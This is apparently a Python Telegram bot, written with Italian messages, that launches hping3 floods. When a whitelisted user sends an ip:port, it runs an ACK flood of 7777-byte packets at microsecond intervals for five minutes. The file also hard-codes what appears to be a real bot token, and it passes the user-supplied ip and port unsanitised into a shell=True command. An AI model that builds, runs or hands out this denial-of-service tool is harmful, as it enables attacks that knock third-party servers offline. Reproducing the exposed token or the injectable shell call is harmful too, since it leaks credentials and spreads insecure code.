from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext
import subprocess
import os
import signal
import socket
import psutil
import threading
import time
import json

# ================= CONFIG =================
TOKEN = "8386952835:AAEJ8hXDq0NRUje_5eChujRZhBwz0Vw2CLI"
MASTER_ID = 5699538596
AUTHORIZED_IDS_FILE = "authorized_ids.json"
MONITOR_INTERVAL = 1
HPING_DURATION = 300
HPING_COOLDOWN = 110
# =========================================

# Caricamento ID autorizzati
if os.path.exists(AUTHORIZED_IDS_FILE):
    with open(AUTHORIZED_IDS_FILE, "r") as f:
        AUTHORIZED_IDS = json.load(f)
else:
    AUTHORIZED_IDS = [MASTER_ID]
    with open(AUTHORIZED_IDS_FILE, "w") as f:
        json.dump(AUTHORIZED_IDS, f)

HOSTNAME = socket.gethostname()
processes = {}
monitor_threads = {}

# ---------- UTILS ----------
def save_ids():
    with open(AUTHORIZED_IDS_FILE, "w") as f:
        json.dump(AUTHORIZED_IDS, f)

def get_cpu_status():
    cpu_total = psutil.cpu_percent(interval=0.1)
    return f"💻 CPU totale: {cpu_total}%"

def is_authorized(user_id):
    return user_id in AUTHORIZED_IDS

def is_master(user_id):
    return user_id == MASTER_ID

def build_main_keyboard():
    keyboard = [
        [InlineKeyboardButton("🟢 START hping3", callback_data="start")],
        [InlineKeyboardButton("💻 CPU", callback_data="cpu")],
        [InlineKeyboardButton("⛔ STOP", callback_data="stop")],
        [InlineKeyboardButton("ℹ️ STATUS", callback_data="status")],
    ]
    return InlineKeyboardMarkup(keyboard)

# ---------- MASTER COMMANDS ----------
def addid(update: Update, context: CallbackContext):
    if not is_master(update.effective_user.id):
        return
    if len(context.args) != 1:
        update.message.reply_text("Uso: /addid <id>")
        return
    try:
        new_id = int(context.args[0])
        if new_id in AUTHORIZED_IDS:
            update.message.reply_text("ID già presente")
            return
        AUTHORIZED_IDS.append(new_id)
        save_ids()
        update.message.reply_text(f"✅ ID {new_id} aggiunto")
    except ValueError:
        update.message.reply_text("ID non valido")

def removeid(update: Update, context: CallbackContext):
    if not is_master(update.effective_user.id):
        return
    if len(context.args) != 1:
        update.message.reply_text("Uso: /removeid <id>")
        return
    try:
        rem_id = int(context.args[0])
        if rem_id == MASTER_ID:
            update.message.reply_text("Non puoi rimuovere il Master ID")
            return
        if rem_id not in AUTHORIZED_IDS:
            update.message.reply_text("ID non presente")
            return
        AUTHORIZED_IDS.remove(rem_id)
        save_ids()
        update.message.reply_text(f"❌ ID {rem_id} rimosso")
    except ValueError:
        update.message.reply_text("ID non valido")

# ---------- CALLBACK HANDLER ----------
def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    query.answer()

    if not is_authorized(user_id):
        query.edit_message_text("❌ Non autorizzato")
        return

    if query.data == "cpu":
        show_cpu(user_id, query, context)
    elif query.data == "stop":
        stop_hping(user_id, query)
    elif query.data == "status":
        show_status(user_id, query)
    elif query.data == "start":
        # Chiediamo ip:port tramite messaggio
        context.bot.send_message(user_id, "📌 Invia l'IP e la PORTA nel formato: ip:port")

# ---------- CPU MONITOR ----------
def show_cpu(user_id, query, context):
    msg = context.bot.send_message(chat_id=user_id, text=get_cpu_status())
    stop_event = threading.Event()
    key = f"cpu_{user_id}"
    monitor_threads[key] = stop_event

    def monitor():
        while not stop_event.is_set():
            try:
                context.bot.edit_message_text(chat_id=msg.chat_id, message_id=msg.message_id,
                                              text=get_cpu_status())
            except:
                break
            time.sleep(MONITOR_INTERVAL)
    t = threading.Thread(target=monitor, daemon=True)
    t.start()

# ---------- HPING COMMAND ----------
def start_hping(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        return
    text = update.message.text.strip()
    if ":" not in text:
        update.message.reply_text("Formato errato, usa ip:porta")
        return
    ip, port = text.split(":", 1)
    port = port.strip()
    key = str(user_id)
    now = time.time()
    if key in processes:
        p_info = processes[key]
        if p_info.get('proc') and p_info['proc'].poll() is None:
            update.message.reply_text("⚠️ Processo già in esecuzione")
            return
        if 'cooldown' in p_info and now < p_info['cooldown']:
            remaining = int(p_info['cooldown'] - now)
            update.message.reply_text(f"⏱️ Cooldown attivo: {remaining}s")
            return

    cmd = f"hping3 {ip} -A -p {port} -d 7777 -i u1"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
    end_time = now + HPING_DURATION
    processes[key] = {'proc': proc, 'end_time': end_time, 'cooldown': now + HPING_DURATION + HPING_COOLDOWN}
    msg = update.message.reply_text(f"⏳ Avvio hping3 su {ip}:{port} per {HPING_DURATION}s")

    def countdown():
        while True:
            remaining = int(end_time - time.time())
            if remaining <= 0:
                update.message.reply_text(f"✅ Tempo finito. Cooldown di {HPING_COOLDOWN}s iniziato.")
                break
            try:
                context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id,
                                              text=f"⏳ hping3 in esecuzione: {remaining}s")
            except:
                pass
            time.sleep(1)
    t = threading.Thread(target=countdown, daemon=True)
    t.start()

# ---------- STOP / STATUS ----------
def stop_hping(user_id, query):
    key = str(user_id)
    if key in processes and processes[key].get('proc') and processes[key]['proc'].poll() is None:
        os.killpg(os.getpgid(processes[key]['proc'].pid), signal.SIGTERM)
        processes[key]['proc'] = None
        query.edit_message_text("⛔ Processo fermato")
    else:
        query.edit_message_text("ℹ️ Nessun processo attivo")

def show_status(user_id, query):
    key = str(user_id)
    now = time.time()
    if key in processes:
        p_info = processes[key]
        proc_active = p_info.get('proc') and p_info['proc'].poll() is None
        remaining = int(p_info['end_time'] - now) if proc_active else 0
        cooldown_remaining = int(p_info['cooldown'] - now) if 'cooldown' in p_info and now < p_info['cooldown'] else 0
        status_msg = "🟢 ATTIVO" if proc_active else "🔴 FERMO"
        msg = f"Stato: {status_msg}\n"
        if proc_active:
            msg += f"Tempo rimanente: {remaining}s\n"
        if cooldown_remaining:
            msg += f"⏱️ Cooldown: {cooldown_remaining}s"
        query.edit_message_text(msg)
    else:
        query.edit_message_text("🔴 Nessun processo avviato")

# ---------- START COMMAND ----------
def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        return
    update.message.reply_text(f"🤖 Bot attivo su {HOSTNAME}", reply_markup=build_main_keyboard())

# ---------- MAIN ----------
def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    # Master commands
    dp.add_handler(CommandHandler("addid", addid, pass_args=True))
    dp.add_handler(CommandHandler("removeid", removeid, pass_args=True))

    # Start command
    dp.add_handler(CommandHandler("start", start))

    # Captura ip:port per hping3
    dp.add_handler(CommandHandler("ipport", start_hping))  # l’utente deve inviare ip:port come messaggio privato

    # Inline buttons
    dp.add_handler(CallbackQueryHandler(button_handler))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()